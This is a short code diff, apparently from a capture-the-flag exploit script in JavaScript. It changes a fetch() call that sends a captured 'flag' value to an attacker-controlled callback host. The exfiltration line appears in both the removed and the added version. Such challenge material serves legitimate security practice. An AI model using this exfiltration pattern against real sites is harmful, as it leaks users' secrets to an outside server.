@@ -28,7 +28,7 @@
 
                 if(b) break;
             }
-            fetch(`http://${callback}/flag=${flag}`, {method:'get'});
+            fetch(`http://${callback}/?flag=${flag}`, {method:'get'});
         }
 
         getFlag(abc);
